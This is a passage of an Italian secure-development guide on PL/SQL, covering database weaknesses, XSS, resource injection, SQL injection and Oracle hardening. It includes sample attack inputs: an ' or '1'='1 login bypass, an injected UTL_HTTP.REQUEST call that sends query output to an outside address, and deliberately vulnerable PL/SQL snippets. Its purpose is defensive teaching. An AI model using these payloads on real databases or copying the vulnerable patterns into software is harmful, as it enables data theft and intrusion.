.. _plsql:

7.3 PL/SQL
==========

PL/SQL è un linguaggio interpretato che, nelle sue varie forme e
derivazioni, viene utilizzato principalmente dai seguenti prodotti
RDBMS: Oracle Database Server (e relativo modulo per Apache – modplsql),
Microsoft Sql Server, PostgreSQL, MySQL. In quanto orientato alla
manipolazione di dati presenti sui database, il PL/SQL possiede alcune
criticità intrinseche che derivano dalla mancanza di strumenti interni
al linguaggio votati all'esecuzione dei task di sicurezza più semplici
(es: funzioni di libreria standard per il eimpos delle stringhe, etc.),
e si manifestano in due tipi fondamentali di vulnerabilità: i buffer
overflow, e l'sql-injection. Per il fatto che i linguaggi orientati allo
sviluppo di procedure sono strettamente legati alle tecnologie dei
database, la loro trattazione non può prescindere da una trattazione dei
prodotti RDBMS e delle stored procedures che essi offrono come set di
strumenti standard per la manipolazione dei dati. Per questo motivo, e
per il fatto che il PL/SQL, nella sua forma canonica ed originaria, è
supportato dal database Oracle, si è scelto di esporre brevemente le
criticità di ogni prodotto menzionato, per poi riservare ad Oracle ed
alle sue stored procedures una trattazione più estesa. Di seguito i
prodotti RDBMS che supportano la costruzione di stored procedures e le
loro relative criticità che, si ritiene opportuno ricordare per
coadiuvare la scrittura di procedure sicure.

**Oracle database Server – criticità**

Supporta le SubSelect Supporta ‘UNION’ Supporta le stored procedures Non
supporta statement multipli Molte stored procedures preeimpostate,
alcune pericolose Oracle 9i: 10700 procedure, 760 packages, di cui gli
utenti con privilegi minimi possono eseguire 5700 procedure, 430
packages Oracle 10g: 16500 procedure, 1300 packages di cui gli utenti
con privilegi minimi possono eseguire 5700 : 8900 procedure, 730
packages

**MySQL – criticità**

Supporta la redirezione del'output ai file con la direttiva ‘INTO
OUTFILE’ Supporta ‘UNION’ (dalla versione 4.x) In molti casi è possibile
utilizzare statement multipli

**DB2 – criticità**

Supporta le SubSelect Supporta ‘UNION’ Supporta le stored procedures Non
supporta statement multipli

**PostgreSQL – criticità**

Supporta ‘COPY’ se eseguito come superuser Supporta le SubSelect
Supporta ‘UNION’ Supporta le stored procedures Supporta gli statement
multipli

**MS SQL Server – criticità**

Supporta le SubSelect Supporta ‘UNION’ Supporta le stored procedures
Supporta gli statement multipli Molte store procedures preimpostate sono
pericolose

.. _cross-site-scripting-xss-3:

.. _cross-site-scripting-xss-3:

7.3.1 Cross-site scripting (XSS)………………………………………………………………………………………………………………
--------------------------------------------------------------------------

**Come riconoscerla**

::

    Reflected XSS All Clients puo' utilizzare strumenti di tipo "Social engineering" per carpire
   informazioni dagli utenti web tramite tecniche di bassa tecnologia sviluppate da malintenzionati
   per ottenere informazioni personali, possono, ad esempio, essere simulate pagine quasi identiche
   ad altri siti di largo utilizzo per ottenere informazioni riservate;
    Stored XSS: attraverso questa vulnerabilità un utente malintenzionato potrebbe intercettare lo
   scambio di informazioni sensibili tra un'applicazione e i database relativi allo storage delle
   informazioni stesse. Quando un altro utente accede successivamente a questi dati, le pagine web
   possono essere riscritte e possono essere attivati script dannosi. La vulnerabilità è dovuta all'uso di
   dati prelevati da database in modo arbitrario, senza che prima queste informazioni vengano
   codificate in un formato sicuro. L'applicazione crea pagine web che includono i dati dal database
   dell'applicazione. I dati vengono incorporati direttamente nell'HTML della pagina, in modo che il
   browser visualizzerà queste informazioni come parte della pagina web. Questi dati possono essere
   originati da un altro utente. Se i dati includono frammenti HTML o Javascript, l’utente non sarà in
   grado di sapere che questa non è la pagina da lui voluta bensì un’altra pagina modificata in modo
   fraudolento. La vulnerabilità è il risultato di incorporare dati di database arbitrari, senza prima
   averli codificati in un formato che impedisca al browser di trattare queste informazioni come HTML
   anziché come testo normale.

**Come difendersi**

Al fine di prevenire le problematiche inerenti alla vulnerabilita'
“Reflected XSS All Clients” si consiglia di mettere in atto le
indicazioni come di seguito:

::

    Validare tutti gli input, indipendentemente dalla sorgente. Per la validazione, si consiglia
   l’approccio whitelist (sono accettati solo i dati che adottano una struttura specificata nella
   whitelist, scartando quelli che non la rispettano). Controllare:
   o Data type;
   o Size;
   o Range;
   o Format;
   o Expected values;
    Codificare completamente tutti i dati dinamici prima di incorporare queste informazioni nell'output
   desiderato. La codifica dovrebbe essere context-sensitive. Ad esempio:
   o Codifica HTML per pagine HTML;
   o Attributi HTML codificati per gli output dei dati relativi;
   o Codifica JavaScript per server-generated JavaScript.
    Si consiglia di utilizzare la libreria di codifica ESAPI o le funzioni di libreria sistema incorporate.
    Nell'intestazione di risposta Content-Type HTTP, definire esplicitamente la codifica dei caratteri
   (charset) per l'intera pagina
    Impostare la flag httpOnly sul cookie della sessione, per impedire che eventuali tentativi di tecniche
   fraudolente di XSS possano venire in possesso del cookie stesso

Per ulteriori informazioni si veda:
http://cwe.mitre.org/data/definitions/79.html CWE-79: Improper
Neutralization of Input During Web Page Generation (‘Cross-site
Scripting’)

.. _resource-injection-2:

.. _resource-injection-2:

7.3.2 Resource Injection
------------------------

**Come riconoscerla**

Un utente malintenzionato potrebbe aprire una backdoor che potrebbe
permettere all'attaccante di connettersi direttamente al server con
possibili conseguenze molto gravi per la sicurezza. Attraverso questa
vulnerabilità un possibile malintenzionato potrebbe utilizzare eventuali
connessioni aperte dall'utente, nel caso non fossero gestite
adeguatamente. Questo attacco consiste nel cambiare gli identificatori
delle risorse utilizzate da un'applicazione trasformandoli in strumenti
potenzialmente dannosi. Quando un'applicazione consente ad un input
utente di definire una risorsa, ad esempio un nome di file o un numero
di porta, senza dei controlli opportuni potrebbe essere possibile per un
hacker manipolare queste informazioni per eseguire o accedere a diverse
risorse minando la sicurezza del sistema.

**Come difendersi**

::

    Non consentire a un utente di definire i parametri relativi ai sockets di rete.
   Esempio:
   Questo esempio in PLSQL prende un path di tipo URL da una CGI e esegue il download del file
   contenuto. La vulnerabilità e' rappresentata dalla possibilità per un utente malintenzionato di
   modificare il path del file o il nome del file stesso ricevendo dal server del contenuto arbitrario e
   potenzialmente dannoso.
   filename := SUBSTR(OWA_UTIL.get_cgi_env('PATH_INFO'), 2);
   WPG_DOCLOAD.download_file(filename);

Per ulteriori informazioni si veda:
http://cwe.mitre.org/data/definitions/99.html, CWE-99: Improper Control
of Resource Identifiers (‘Resource Injection’).

.. _second-order-sql-injection-2:

.. _second-order-sql-injection-2:

7.3.3 (Second Order) SQL Injection
----------------------------------

**Come riconoscerla**

Un utente malintenzionato potrebbe accedere direttamente a tutti i dati
del sistema. Utilizzando strumenti e modifiche di testo semplici,
l'aggressore potrebbe rubare qualsiasi informazione riservata
memorizzata dal sistema (ad esempio i dati personali dell'utente o le
carte di credito) e eventualmente modificare o cancellare i dati
esistenti. L'applicazione comunica con il suo database inviando una
query SQL in formato testo. L'applicazione crea la query semplicemente
concatenando le stringhe tra cui i dati ottenuti dal database. Poiché
questi dati possono essere stati in precedenza ottenuti dall'input
dell'utente e non sono stati verificati la validità del tipo di dati né
successivamente sanificati, i dati potrebbero contenere comandi SQL che
verrebbero interpretati come tali dal database.

**Come difendersi**

Al fine di prevenire le problematiche inerenti la vulnerabilita' “SQL
Injection” si consiglia di mettere in atto le indicazioni come di
seguito:  Validare tutti gli input, indipendentemente dalla sorgente.
La validazione dovrebbe essere basata su una whitelist: dovrebbero
essere accettati solo i dati che adattano a una struttura specificata,
scartando quelli che non rispettano la whitelist. Controllare: o Data
type; o Size; o Range; o Format; o Expected values;  Invece di
concatenare le stringhe si consiglia di: o Utilizzare componenti di
database sicuri come le procedure memorizzate, query parametrizzate e le
associazioni degli oggetti (per comandi e parametri). o Una soluzione
ancora migliore è quella di utilizzare una libreria ORM, come
EntityFramework, Hibernate o iBatis  Limitare l'accesso agli oggetti e
alle funzionalità di database, in base al “Principle of Least Privilege”
(non fornire diretti agli utenti maggiori di quelli strettamente
necessari).  Validare sempre l'input e accettare solo valori che
corrispondono a un elenco di valori ammessi (white list).  Per evitare
la SQL Injection è necessario evitare di concatenare le stringhe e
affidarsi alle stored procedures e alle query parametriche (prepared
statement). Meglio ancora utilizzare una libreria ORM come
EntityFramework, Hibernate, or iBatis. Esempio: L'SQL Injection è un
particolare tipo di attacco il cui scopo è quello di indurre il database
ad eseguire query SQL non autorizzate. Consideriamo la seguente query:
SELECT \* FROM Tabella WHERE
username=‘:math:`user' AND password='`\ pass’ $user e $pass sono
impostate dall'utente e supponiamo che nessun controllo su di esse venga
fatto. Vediamo cosa succede inserendo i seguenti valori: $user = ' or
‘1’ = ‘1 $pass =’ or ‘1’ = ‘1 La query risultante sarà: SELECT \* FROM
Tabella WHERE username=’' or ‘1’ = ‘1’ AND password='' or ‘1’ = ‘1’ 
Approccio tramite whitelist : nell'approccio whitelist abbiamo un
insieme di caratteri validi. Ad ogni richiesta fatta, se l'input
ricevuto contiene dei caratteri non presenti in tale lista, allora
segnaleremo un errore. Ciò comporta una attenta definizione della lista
in fase di definizione dei requisiti dell'applicazione oltre che una
corretta gestione dei caratteri permessi (se permetto il carattere ' e
poi non lo gestisco adeguatamente non risolvo nulla).

::

    Oltre la whitlist si puo’ anche usare il metodo della concatenazione delle variabili con uso della
   funzionalita’ “quote” per evitare un SQL injection attack.
   Esempio - Forma non corretta:
   SQLExec("SELECT NAME, PHONE FROM PS_INFO WHERE NAME='" | &UserInput | "'",
   &Name, &Phone);
   Esempio - Forma corretta
   SQLExec("SELECT NAME, PHONE FROM PS_INFO WHERE NAME='" |
   Quote(&UserInput) | "'", &Name, &Phone);

Per ulteriori informazioni si veda:
http://cwe.mitre.org/data/definitions/89.html CWE-89, Improper
Neutralization of Special Elements used in an SQL Command (‘SQL
Injection’)

.. _ulteriori-indicazioni-per-lo-sviluppo-sicuro-2:

.. _ulteriori-indicazioni-per-lo-sviluppo-sicuro-2:

7.3.4 Ulteriori indicazioni per lo sviluppo sicuro
--------------------------------------------------

Di seguito ulteriori direttive per lo sviluppo PL/SQL in sicurezza.

.. _posizionamento-delle-procedure-plsql-.:

7.3.4.1 Posizionamento delle procedure PL/SQL ………………………………………………………………………………………………….
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

::

    E’ necessario valutare attentamente la posizione in cui si collocano le procedure sviluppate:
   o In file separati, organizzati per categoria, sul filesystem del db server:
    Minor numero di vulnerabilità derivanti dal fatto che il codice non viene precaricato
    Implementazione di meccaniche di “failover” più semplice
    Possibilità dell’uso del version-control e backup
    Maggiore protezione del codice sorgente, difficile da sovrascrivere
   o Nei packages del DB:
    Maggior efficenza del codice
    Accesso al codice tramite la tabella USER_SOURCE
    Integrazione con alcuni IDE

.. _tipologie-di-procedure-vulnerabili-..:

7.3.4.2 Tipologie di procedure vulnerabili …………………………………………………………………………………………………………..
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

L'utilizzo di differenti strumenti di manipolazione dei dati che il
PL/SQL mette a disposizione del programmatore, determina la modalità con
cui il codice viene scritto, ed in ultima istanza determina la tipologia
di risorsa che il codice andrà a comporre. Esistono in PL/SQL i seguenti
tipi di “risorse”: o embedded SQL o cursori (ovvero i recordset del
PL/SQL) o EXECUTE IMMEDIATE (ovvero PL/SQL dinamico) o Packages o
Triggers Per tutte queste differenti tipologie di risorse, comunque, la
casistica in cui il PL/SQL risulta vulnerabile può essere ridotta a due
tipologie di codice: o Blocco di PL/SQL anonimo, ovvero un blocco di
PL/SQL che ha un BEGIN ed un END può essere utilizzato per eseguire
query multiple. Esempio: EXECUTE IMMEDIATE ‘BEGIN INSERT INTO TABELLA
(COLONNA1) VALUES (‘’' \|\| PARAM \|\| ‘''); END;'; o Blocco di PL/SQL
singolo, ovvero quel codice che non è dichiarato con BEGIN ed END, e non
permette l'utilizzo del carattere “;” per l'iniezione di query multiple.
Esempio: OPEN cur_cust FOR ‘select name from customers where id = ‘’'|\|
p_idtofind \|\| ‘''';

.. _filtraggio-dei-tipi-di-input-iniettabile-..:

7.3.4.3 Filtraggio dei tipi di input iniettabile ………………………………………………………………………………………………………..
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Quando si utilizzano le stored procedures, è necessario porre opportuna
attenzione al filtraggio dei seguenti tipi di input: o UNIONI: possono
essere utilizzate per includere query ulteriori rispetto a quelle
effettuate dalla stored procedure. o SUBSELECTS o Comandi DDL/DML
(INSERT, UPDATE, DELETE etc.) o Nomi dei packages

.. _filtraggio-di-caratteri-potenzialmente-dannosi-.:

7.3.4.4 Filtraggio di caratteri potenzialmente dannosi ………………………………………………………………………………………….
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

::

    È necessario che i caratteri “ (ASCII 34), ‘ (ASCII 39), in tutte le loro possibili codifiche (hex, ascii, utf-
   8, etc.), siano filtrati e/o opportunamente sanitizzati mediante escaping.
    È inltre necessario che i caratteri # (ASCII 35), -- (ASCII 4545), % (ASCII 37), ; (ASCII 59), in tutte le
   loro possibili codifiche (hex, ascii, utf-8, etc.) siano filtrati e/o opportunamente sanitizzati mediante
   escaping.

.. _direttive-per-oracle:

7.3.4.5 Direttive per Oracle ………………………………………………………………………………………………………………………………
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Si elencano di seguito le direttive di configurazione del database
Oracle alle quali è necessario attenersi – nei limiti posti dalle
esigenze applicative – per raggiungere un elevato livello di sicurezza
delle applicazioni sviluppate con questa tecnologia.  Account: o è
necessario disabilitare gli account di default del database; o è
necessario cambiare la password all'utente SYS;  Ruoli: o è necessario
revocare il ruolo RESOURCE dagli utenti; o è necessario revocare il
ruolo CONNECT da tutti gli utenti;  Permessi: o è necessario revocare
il permesso pubblico di esecuzione su utl_file (vedi par. “prevenire
l'upload remoto di file”) ; o è necessario revocare il permesso pubblico
di esecuzione su utl_http (vedi par. “prevenire la redirezione
dell'output”) ; o è necessario revocare il permesso pubblico di
esecuzione su utl_tcp ; o è necessario revocare il permesso pubblico di
esecuzione su utl_smtp ; o è necessario controllare il permesso pubblico
di esecuzione sui packages e le viste di cui gli utenti sys e dba sono
proprietari; o è necessario revocare il permesso pubblico su
dbms_random; o è necessario revocare il permesso pubblico su dbms_lob ;
o è necessario revocare ogni tipo di permesso su dbms_sql e dbms_sys_sql
granted; o è necessario utilizzare i permessi dell'utente chiamante per
ogni tipo di procedura; o è necessario controllare e opportunamente
dispensare il permesso “BECOME USER”; o è necessario controllare e
opportunamente dispensare il permesso “CREATE ANY DIRECTORY”; o è
necessario controllare e opportunamente dispensare il permesso “CREATE
JOB”; o è necessario controllare e opportunamente dispensare il permesso
“CREATE LIBRARY” ; o è necessario revocare ogni permesso di esecuzione
su sys.initjvmaux; o è necessario revocare il permesso pubblico di
esecuzione su dbms_job; o è necessario revocare il permesso pubblico di
esecuzione su dbms_scheduler ; o è necessario revocare il permesso
pubblico di esecuzione su owa_util; o è necessario negare l'accesso
all'esecuzione di “SELECT ANY TABLE”; o è necessario controllare ed
opportunamente disporre i permessi di accesso al package
dbms_backup_restore;

o è necessario revocare il permesso di creazione degli oggetti a tutti
gli utenti eccetto quelli proprietari dello schema; o è necessario
controllare l'accesso agli oggetti ed assicurarsi che gli utenti possano
interagire unicamente con gli oggetti che sono loro necessari; o è
necessario impedire al dba di leggere le tabelle di sistema; o è
necessario impedire al dba di leggere i dati dell'applicazione. o
Inoltre:  è necessario controllare ed opportunamente sanitizzare il
parametro utl_file_dir;  è necessario controllare l'accesso di Java al
sistema operativo;  è necessario controllare e regolare opportunamente
la maniera in cui Java e Oracle interagiscono;  è necessario rendere
extproc sicuro;  è necessario settare il parametro \_trace_files_public
a FALSE ;  è necessario controllare e rendere sicuro il package
statspack;  Offuscamento del codice con WRAP: l'utility “wrap”
(utilizzabile nella forma: wrap iname=input_file [oname=output_file]),
deve essere utilizzato per offuscare i files SQL ove le procedure sono
memorizzate.È necessario ricordare che l'utility wrap è in grado di
offuscare il codice rendendo di difficile lettura il sorgente (e quindi
l'algoritmo), ma non è in grado di proteggere eventuali stringhe di
testo memorizzate staticamente nel codice, come nomi di tabelle e
passwords.  Prevenire la redirezione dell'output; è sempre necessario
filtrare l'accesso al package UTL_HTTP che può essere utilizzato per la
redirezione dell'output nelle query. Esempio di forma non corretta :
SELECT TRANSLATE(‘input utente’, ‘0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ’,
‘0123456789’) FROM DUAL; Valorizzando l'input utente come: ‘' \|\|
UTL_HTTP.REQUEST(‘http://10.0.0.1/ricevi.php’) \|\| ‘' La procedura
diventa: SELECT TRANSLATE(‘' \|\|
UTL_HTTP.REQUEST(‘http://10.0.0.1/ricevi.php’) \|\| ‘',
‘0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ’, ‘0123456789’) FROM DUAL; 
Prevenire l'upload remoto di file - È sempre necessario filtrare
l'accesso al package UTL_FILE che può essere il trasferimento di file
tramite stored procedures.  Prevenire l'iniezione di chiamata a
funzioni - È sempre necessario limitare opportunamente il contesto di
transazione di una procedura. È inoltre necessario evitare di utilizzare
la direttiva PRAGMA AUTONOMOUS_TRANSACTION ove non necessario, onde
evitare di modificare il contesto transazionale all'interno del quale la
query viene eseguita.  Dichiarazione dei privilegi di esecuzione delle
procedure: o È necessario dichiarare le procedure utilizzando la keyword
AUTHID CURRENT_USER o È necessario revocare il privilegio EXECUTE sui
pacchetti e sulle procedure standard di Oracle non utilizzati. o È
necessario garantire i permessi alle operazioni di creazione (CREATE) e
modifica (ALTER) di procedure unicamente ad utenze “trusted”. o È
necessario definire i permessi delle funzioni associandoli unicamente ad
utenti “trusted”  È necessario garantire il ruolo RESOURCE unicamente
ad utenti "trusted.
